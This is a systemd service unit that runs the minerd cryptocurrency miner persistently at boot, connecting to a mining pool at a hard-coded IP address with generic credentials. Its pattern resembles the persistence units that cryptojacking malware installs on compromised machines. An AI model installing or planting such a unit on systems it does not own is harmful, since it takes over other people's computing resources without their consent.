[Unit]
Description=Micro Miner Daemon
After=network.target

[Service]
ExecStart=/usr/local/bin/minerd -a sha256d --url=stratum+tcp://161.97.142.9:6633 --userpass=admin.001:admin

Restart=always
PrivateTmp=true
TimeoutStopSec=60s
TimeoutStartSec=10s
StartLimitInterval=120s
StartLimitBurst=5

[Install]
WantedBy=multi-user.target
